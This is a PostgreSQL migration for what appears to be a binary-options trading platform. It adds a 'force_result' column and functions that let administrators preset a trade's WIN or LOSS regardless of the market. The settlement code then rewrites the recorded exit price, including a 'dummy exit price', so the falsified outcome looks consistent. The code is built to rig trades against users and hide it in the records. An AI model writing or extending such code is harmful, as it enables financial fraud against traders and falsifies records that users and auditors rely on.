-- Add exit_price and force_result to trades table
ALTER TABLE public.trades ADD COLUMN IF NOT EXISTS exit_price NUMERIC;
ALTER TABLE public.trades ADD COLUMN IF NOT EXISTS force_result trade_result;

-- Update settle_trade to respect force_result and save exit_price
CREATE OR REPLACE FUNCTION public.settle_trade(
  p_trade_id UUID,
  p_exit_price NUMERIC
) RETURNS VOID AS $$
DECLARE
  v_trade RECORD;
  v_payout NUMERIC;
  v_result trade_result;
  v_final_exit_price NUMERIC;
BEGIN
  -- Get trade details
  SELECT * INTO v_trade FROM public.trades WHERE id = p_trade_id FOR UPDATE;
  
  -- Check if trade is already settled
  IF v_trade.result != 'PENDING' THEN
    RETURN;
  END IF;

  v_final_exit_price := p_exit_price;

  -- Determine result
  IF v_trade.force_result IS NOT NULL THEN
    v_result := v_trade.force_result;
    -- Adjust exit price to match forced result if necessary
    IF v_result = 'WIN' THEN
      IF v_trade.direction = 'UP' AND v_final_exit_price <= v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price + 0.01;
      ELSIF v_trade.direction = 'DOWN' AND v_final_exit_price >= v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price - 0.01;
      END IF;
    ELSIF v_result = 'LOSS' THEN
      IF v_trade.direction = 'UP' AND v_final_exit_price > v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price - 0.01;
      ELSIF v_trade.direction = 'DOWN' AND v_final_exit_price < v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price + 0.01;
      END IF;
    END IF;
  ELSE
    IF v_trade.direction = 'UP' THEN
      IF v_final_exit_price > v_trade.entry_price THEN
        v_result := 'WIN';
      ELSE
        v_result := 'LOSS';
      END IF;
    ELSE -- DOWN
      IF v_final_exit_price < v_trade.entry_price THEN
        v_result := 'WIN';
      ELSE
        v_result := 'LOSS';
      END IF;
    END IF;
  END IF;

  -- Calculate payout if WIN
  IF v_result = 'WIN' THEN
    v_payout := v_trade.amount + (v_trade.amount * v_trade.payout_percentage / 100);
    -- Update user balance
    UPDATE public.users SET balance = balance + v_payout WHERE id = v_trade.user_id;
    
    -- Log WIN transaction
    INSERT INTO public.transactions (user_id, type, amount, status, reference)
    VALUES (v_trade.user_id, 'TRADE_WIN', v_payout, 'COMPLETED', v_trade.id::TEXT);
  ELSE
    v_payout := 0;
  END IF;

  -- Update trade record
  UPDATE public.trades 
  SET 
    result = v_result, 
    payout = v_payout, 
    exit_price = v_final_exit_price,
    settled_at = NOW() 
  WHERE id = p_trade_id;

END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Update admin_settle_trade to handle exit_price and immediate settlement
CREATE OR REPLACE FUNCTION public.admin_settle_trade(
  p_trade_id UUID,
  p_result trade_result
) RETURNS VOID AS $$
DECLARE
  v_trade RECORD;
  v_payout NUMERIC;
  v_exit_price NUMERIC;
BEGIN
  IF NOT is_admin() THEN RAISE EXCEPTION 'Unauthorized'; END IF;
  
  SELECT * INTO v_trade FROM public.trades WHERE id = p_trade_id FOR UPDATE;
  IF v_trade.result != 'PENDING' THEN RAISE EXCEPTION 'Trade already settled'; END IF;
  
  -- Calculate a dummy exit price that matches the result
  IF p_result = 'WIN' THEN
    IF v_trade.direction = 'UP' THEN
      v_exit_price := v_trade.entry_price + (v_trade.entry_price * 0.001);
    ELSE
      v_exit_price := v_trade.entry_price - (v_trade.entry_price * 0.001);
    END IF;
    
    v_payout := v_trade.amount + (v_trade.amount * v_trade.payout_percentage / 100);
    UPDATE public.users SET balance = balance + v_payout WHERE id = v_trade.user_id;
    INSERT INTO public.transactions (user_id, type, amount, status, reference)
    VALUES (v_trade.user_id, 'TRADE_WIN', v_payout, 'COMPLETED', v_trade.id::TEXT);
  ELSE
    IF v_trade.direction = 'UP' THEN
      v_exit_price := v_trade.entry_price - (v_trade.entry_price * 0.001);
    ELSE
      v_exit_price := v_trade.entry_price + (v_trade.entry_price * 0.001);
    END IF;
    
    v_payout := 0;
  END IF;
  
  UPDATE public.trades 
  SET 
    result = p_result, 
    payout = v_payout, 
    exit_price = v_exit_price,
    settled_at = NOW() 
  WHERE id = p_trade_id;
  
  INSERT INTO public.admin_logs (admin_id, action, details)
  VALUES (auth.uid(), 'SETTLE_TRADE', jsonb_build_object('trade_id', p_trade_id, 'result', p_result, 'exit_price', v_exit_price));
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Function to set force_result
CREATE OR REPLACE FUNCTION public.set_trade_force_result(
  p_trade_id UUID,
  p_force_result trade_result
) RETURNS VOID AS $$
BEGIN
  IF NOT is_admin() THEN RAISE EXCEPTION 'Unauthorized'; END IF;
  
  UPDATE public.trades 
  SET force_result = p_force_result 
  WHERE id = p_trade_id AND result = 'PENDING';
  
  INSERT INTO public.admin_logs (admin_id, action, details)
  VALUES (auth.uid(), 'SET_FORCE_RESULT', jsonb_build_object('trade_id', p_trade_id, 'force_result', p_force_result));
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
